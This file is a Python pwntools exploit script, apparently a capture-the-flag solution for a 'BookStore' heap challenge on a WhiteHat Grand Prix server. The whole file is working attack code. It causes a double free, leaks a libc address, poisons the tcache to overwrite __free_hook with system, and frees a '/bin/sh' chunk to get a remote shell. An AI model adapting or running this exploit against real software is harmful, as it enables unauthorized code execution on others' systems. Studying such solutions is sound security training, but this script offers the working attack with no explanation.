from pwn import *
import time
#context(log_level='debug')
re = 1
if re == 0:
	elf = ELF('./BookStore')
	p = process(elf.path)
	print proc.pidof(p)[0]
	raw_input()
else:
	p = remote('pwn02.grandprix.whitehatvn.com', 8005)

def add(title,size,brief,ref,best):
	p.sendlineafter('choice:','1')
	p.sendlineafter('Title:',title)
	p.sendlineafter('size:',size)
	p.sendlineafter('brief:',brief)
	p.sendlineafter('title:',ref)
	p.sendlineafter('(Y/N)',best)

def dele(title):
	p.sendlineafter('choice:','3')
	p.sendlineafter('Title:',title)	

def edit(title,size,brief,best):
	p.sendlineafter('choice:','2')
	p.sendlineafter('title:',title)
	p.sendlineafter('title:',title)
	p.sendlineafter('size:',size)
	p.recvuntil('brief:')
	p.send(brief)
	p.sendlineafter('(Y/N)',best)

def list():
	p.sendlineafter('choice:','4')

add('1','127','1','ref','y')
for i in range(2,9):
	add(str(i),'127',str(i),'ref','n')

for i in range(1,9):
	dele(str(i))
dele('1')
list()
p.recvuntil('\x31\x7c\x1b\x5b\x33\x33\x6d')
libc_addr = u64(p.recvuntil('\x1b')[:-1].ljust(8,'\x00')) - 0x3ebca0
print hex(libc_addr)

add('1','127','1','ref','y')
add('2','127','2','ref','n')
add('3','127','/bin/sh\0\n','ref','n')
dele('1')
dele('1')
add('1','127','1','ref','y')
dele('2')
dele('1')
free_hook = libc_addr + 0x00000000003ed8e8
system = libc_addr + 0x000000000004f440
add('p1','127',p64(free_hook),'ref','n')
add('p2','57',p64(0),'ref','n')
add('p3','127','p3','ref','n')
add('p4','127','p4','ref','n')
add('p5','127',p64(system),'ref','n')
dele('3')

p.interactive()
